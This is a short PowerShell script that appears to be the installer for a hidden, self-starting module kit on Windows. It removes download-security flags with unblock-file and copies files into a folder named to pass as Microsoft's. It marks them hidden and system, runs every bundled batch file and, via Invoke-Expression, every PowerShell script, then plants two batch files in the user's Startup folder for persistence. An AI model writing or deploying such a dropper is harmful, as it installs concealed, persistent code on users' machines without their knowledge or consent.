# Paths & Settings
$location = Get-Location
$scripts = "${location}\scripts"
$sourcePathSystem = "${location}\system"
$sourcePathLocal = "${location}\local"
$destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
$resourcesPath = "${location}\extra"
# Script Settings
$video = 2

# Unblock Files
Get-ChildItem -r | unblock-file

# Copy to System
Robocopy "${sourcePathSystem}" "${destinationPath}" /A+:SH /MIR /MT

# Hide
Get-ChildItem -r "${destinationPath}\" | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 }

# Run Batch Scripts (.bat)
$scriptsBatch = Get-ChildItem -Path "${scripts}\batch" -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $scriptsBatch) { if ($i.EndsWith('.bat')) { Start-Process $i } }

# Run Powershell Scripts (.ps1)
$scriptsPowershell = Get-ChildItem -Path "${scripts}\powershell" -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $scriptsPowershell) { if ($i.EndsWith('.ps1')) { $exp = Get-Content -Path $i -Raw; Invoke-Expression $exp; Set-Location $location } }

# Move to shell:startup
Move-Item "${destinationPath}\module-2\module-2-START-AUTO.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Move-Item "${destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# Run local Modules
$modulesLocal = Get-ChildItem -Path $sourcePathLocal -Directory -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $modulesLocal) { Set-Location $i; Start-Process .\RUN-Module.bat }

# Run System Modules
$modulesSystem = Get-ChildItem -Path $sourcePathSystem -Directory -Recurse | Select-Object -ExpandProperty Name
foreach ($i in $modulesSystem) { Set-Location "${destinationPath}/${i}"; Start-Process .\RUN-Module.bat }
